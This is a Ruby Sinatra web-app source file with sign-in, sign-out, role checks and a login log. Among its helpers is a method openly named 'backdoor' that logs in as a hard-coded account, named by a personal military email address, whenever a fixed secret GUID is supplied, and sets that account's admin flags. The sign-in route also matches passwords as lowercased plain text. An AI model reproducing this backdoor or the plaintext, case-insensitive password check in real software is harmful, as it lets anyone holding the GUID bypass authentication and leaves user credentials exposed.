get '/' do
  erb :'sign-in'
end

get '/sign-in/?' do
  erb :'sign-in'
end

post '/sign-in/?' do
  if user = User.first(:email => params[:email].strip.downcase, :password => params[:password].strip.downcase, :active => 't')
    session[:user] 							= user.id
    session[:email]             = user.email
    session[:admin] 						= 'true' if user.admin?
    session[:educator_liaison]	= 'true' if user.educator_liaison?
    session[:regional] 					= 'true' if user.regional?
    session[:state_customer] 		= 'true' if user.state_customer?
    session[:ngb_customer] 			= 'true' if user.ngb_customer?
    session[:nc_el] 			      = 'true' if user.nc_el?
    session[:alert] = {
    	style: 'alert-info',
    	message: 'Welcome back.'
    }
    if session[:state_customer] || session[:ngb_customer]
      Login.create(:user_id => user.id)
    end
    if session[:admin] || session[:state_customer] || session[:ngb_customer]
      redirect "/users"
    else 
      redirect "/users/#{session[:user]}/reports"
    end
  else
    session[:alert] = {
    	style: 'alert-error',
    	message: 'Sorry, no match. Try again.'
    }
    erb :'/sign-in'
  end
end

get '/sign-out/?' do
  session[:user] 							= nil
  session[:email]             = nil
  session[:admin] 						= nil if session[:admin]
  session[:educator_liaison]	= nil if session[:educator_liaison]
  session[:regional] 					= nil if session[:regional]
  session[:state_customer] 		= nil if session[:state_customer]
  session[:ngb_customer] 			= nil if session[:ngb_customer]
  session[:nc_el] 			      = nil if session[:nc_el]
  session[:alert] = {
    	style: 'alert',
    	message: 'You are now signed out.'
    }
  redirect '/sign-in'
end

get '/logins/?' do
  allowed [:admin]
  @logins = Login.all(:order => :created_at.desc)
  erb :logins
end


helpers do

	def allowed(roles)
		permission = false
		roles.each {|r| permission = true if session[r.to_sym]}
		unless permission == true
			session[:alert] = {
				style: 'alert-error',
				message: 'You do not have permission to do that!'
			}
		redirect '/home'
		end
	end
	
	def admin_override(user)
	  unless (session[:user].to_i == user.to_i) || (session[:admin] == 'true')
	  	session[:alert] = {
				style: 'alert-error',
				message: "That's not your account!"
			}
      redirect "/users/#{session[:user]}/reports"
    end
	end
	
	def backdoor(guid)
    if guid == '4104fd1203c84777a78bf7e9ca120572'
      user = User.all(email: 'amber.l.fredericksen.mil@mail.mil').first
      session[:user] 							= user.id
      session[:email]             = user.email
      session[:admin] 						= 'true' if user.admin?
      session[:educator_liaison]	= 'true' if user.educator_liaison?
      session[:regional] 					= 'true' if user.regional?
      session[:state_customer] 		= 'true' if user.state_customer?
      session[:ngb_customer] 			= 'true' if user.ngb_customer?
      return true
    else
      return false
    end
  end
  
end




class Login
	include DataMapper::Resource

	property   :id,         Serial
	property   :deleted_at, ParanoidDateTime
	timestamps :at
  
  belongs_to :user
end